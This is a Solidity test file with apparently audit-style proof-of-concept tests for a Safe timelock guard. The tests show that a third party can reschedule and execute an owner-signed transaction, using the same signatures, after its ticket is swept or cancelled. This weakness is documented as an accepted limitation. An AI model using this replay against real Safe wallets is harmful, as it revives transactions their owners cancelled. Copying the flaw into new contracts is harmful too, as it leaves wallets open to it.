// SPDX-License-Identifier: MIT
// Accepted limitation: AUDIT_BRIEF.md AR-16, "Owner authorisation survives ticket deletion".
pragma solidity ^0.8.24;

import {TestEnvironment} from "../TestEnvironment.sol";

import {Safe, Enum} from "@safe-global/safe-smart-account/Safe.sol";

import {LockdownTimelock} from "../../src/LockdownTimelock.sol";
import {Timelock} from "../../src/base/Timelock.sol";

contract TicketRevivalTarget {
    uint256 public calls;

    function mark() external {
        ++calls;
    }
}

/// @notice Proofs of the documented owner-authorisation persistence after a ticket slot is deleted.
/// @dev Uses a genuine Safe v1.5.0 execution path for scheduling, cancellation and execution.
contract TicketRevivalPoC is TestEnvironment {
    uint64 private constant DELAY = 24 hours;
    address private constant THIRD_PARTY = address(0xA77AC);
    address private constant FILLER_TARGET = address(0xF111);

    Safe private pocSafe;
    TicketRevivalTarget private target;

    function setUp() public override {
        super.setUp();

        pocSafe = _createConfigureAndInitialise(77);
        target = new TicketRevivalTarget();
        _enableTimelock(pocSafe, DELAY);
    }

    function test_documentedLimitation_sameSignaturesRescheduleAfterSweep() public {
        uint256 nonce = pocSafe.nonce();
        bytes memory data = abi.encodeCall(TicketRevivalTarget.mark, ());
        Timelock.ExecTransactionParams memory params = _ownerParams(address(target), 0, data, Enum.Operation.Call);
        bytes memory signatures =
            _signTxAtNonce(pocSafe, OWNER_PK, address(target), 0, data, Enum.Operation.Call, nonce);
        bytes32 safeTxHash = _safeTxHash(pocSafe, address(target), 0, data, Enum.Operation.Call, nonce);

        vm.prank(THIRD_PARTY);
        guard.scheduleTransaction(address(pocSafe), nonce, params, signatures);
        uint64 firstExecutableAt = guard.getTransactionExecutableAt(address(pocSafe), safeTxHash);

        vm.warp(uint256(firstExecutableAt) + guard.TICKET_TTL() + 1);
        vm.prank(THIRD_PARTY);
        guard.sweepExpiredOwnerTicket(address(pocSafe), safeTxHash);
        assertEq(guard.getTransactionExecutableAt(address(pocSafe), safeTxHash), 0, "ticket swept");

        vm.prank(THIRD_PARTY);
        guard.scheduleTransaction(address(pocSafe), nonce, params, signatures);
        uint64 revivedExecutableAt = guard.getTransactionExecutableAt(address(pocSafe), safeTxHash);
        assertEq(revivedExecutableAt, uint64(block.timestamp) + DELAY, "same signed ticket revived");

        vm.warp(uint256(revivedExecutableAt) + 1);
        assertTrue(
            pocSafe.execTransaction(
                address(target), 0, data, Enum.Operation.Call, 0, 0, 0, address(0), payable(address(0)), signatures
            ),
            "revived transaction executes"
        );
        assertEq(target.calls(), 1, "target reached after revival");
        assertEq(guard.getTransactionExecutableAt(address(pocSafe), safeTxHash), 0, "revived ticket consumed");
    }

    function test_documentedLimitation_sameSignaturesRescheduleAfterCancel() public {
        uint256 nonceBeforeCancel = pocSafe.nonce();
        uint256 targetNonce = nonceBeforeCancel + 10;
        bytes memory targetData = abi.encodeCall(TicketRevivalTarget.mark, ());
        Timelock.ExecTransactionParams memory targetParams =
            _ownerParams(address(target), 0, targetData, Enum.Operation.Call);
        bytes memory targetSignatures =
            _signTxAtNonce(pocSafe, OWNER_PK, address(target), 0, targetData, Enum.Operation.Call, targetNonce);
        bytes32 targetHash = _safeTxHash(pocSafe, address(target), 0, targetData, Enum.Operation.Call, targetNonce);

        vm.prank(THIRD_PARTY);
        guard.scheduleTransaction(address(pocSafe), targetNonce, targetParams, targetSignatures);

        bytes memory cancelData = abi.encodeCall(LockdownTimelock.cancelTransaction, (targetHash));
        bytes memory cancelSignature =
            _signTxAtNonce(pocSafe, OWNER_PK, address(guard), 0, cancelData, Enum.Operation.Call, nonceBeforeCancel);
        assertTrue(
            pocSafe.execTransaction(
                address(guard),
                0,
                cancelData,
                Enum.Operation.Call,
                0,
                0,
                0,
                address(0),
                payable(address(0)),
                cancelSignature
            ),
            "quorum cancellation executes"
        );
        assertEq(pocSafe.nonce(), nonceBeforeCancel + 1, "cancel consumes one Safe nonce");
        assertEq(guard.getTransactionExecutableAt(address(pocSafe), targetHash), 0, "ticket cancelled");

        vm.prank(THIRD_PARTY);
        guard.scheduleTransaction(address(pocSafe), targetNonce, targetParams, targetSignatures);
        uint64 revivedExecutableAt = guard.getTransactionExecutableAt(address(pocSafe), targetHash);
        assertEq(revivedExecutableAt, uint64(block.timestamp) + DELAY, "same signed ticket revived");

        // Schedule the nine intervening nonces so the real Safe can reach targetNonce.
        bytes[] memory fillerData = new bytes[](9);
        bytes[] memory fillerSignatures = new bytes[](9);
        for (uint256 i = 0; i < 9; ++i) {
            uint256 fillerNonce = nonceBeforeCancel + 1 + i;
            fillerData[i] = abi.encode(i);
            fillerSignatures[i] =
                _signTxAtNonce(pocSafe, OWNER_PK, FILLER_TARGET, 0, fillerData[i], Enum.Operation.Call, fillerNonce);
            vm.prank(THIRD_PARTY);
            guard.scheduleTransaction(
                address(pocSafe),
                fillerNonce,
                _ownerParams(FILLER_TARGET, 0, fillerData[i], Enum.Operation.Call),
                fillerSignatures[i]
            );
        }

        vm.warp(uint256(revivedExecutableAt) + 1);
        for (uint256 i = 0; i < 9; ++i) {
            assertTrue(
                pocSafe.execTransaction(
                    FILLER_TARGET,
                    0,
                    fillerData[i],
                    Enum.Operation.Call,
                    0,
                    0,
                    0,
                    address(0),
                    payable(address(0)),
                    fillerSignatures[i]
                ),
                "scheduled filler executes"
            );
        }
        assertEq(pocSafe.nonce(), targetNonce, "Safe reached the revived transaction nonce");

        assertTrue(
            pocSafe.execTransaction(
                address(target),
                0,
                targetData,
                Enum.Operation.Call,
                0,
                0,
                0,
                address(0),
                payable(address(0)),
                targetSignatures
            ),
            "revived future-nonce transaction executes"
        );
        assertEq(target.calls(), 1, "target reached after cancel revival");
        assertEq(guard.getTransactionExecutableAt(address(pocSafe), targetHash), 0, "revived ticket consumed");
    }

    function _ownerParams(address to, uint256 value, bytes memory data, Enum.Operation operation)
        private
        pure
        returns (Timelock.ExecTransactionParams memory)
    {
        return Timelock.ExecTransactionParams({
            to: to,
            value: value,
            data: data,
            operation: operation,
            safeTxGas: 0,
            baseGas: 0,
            gasPrice: 0,
            gasToken: address(0),
            refundReceiver: payable(address(0))
        });
    }

    function _signTxAtNonce(
        Safe safe,
        uint256 privateKey,
        address to,
        uint256 value,
        bytes memory data,
        Enum.Operation operation,
        uint256 nonce
    ) private view returns (bytes memory) {
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, _safeTxHash(safe, to, value, data, operation, nonce));
        return abi.encodePacked(r, s, v);
    }
}
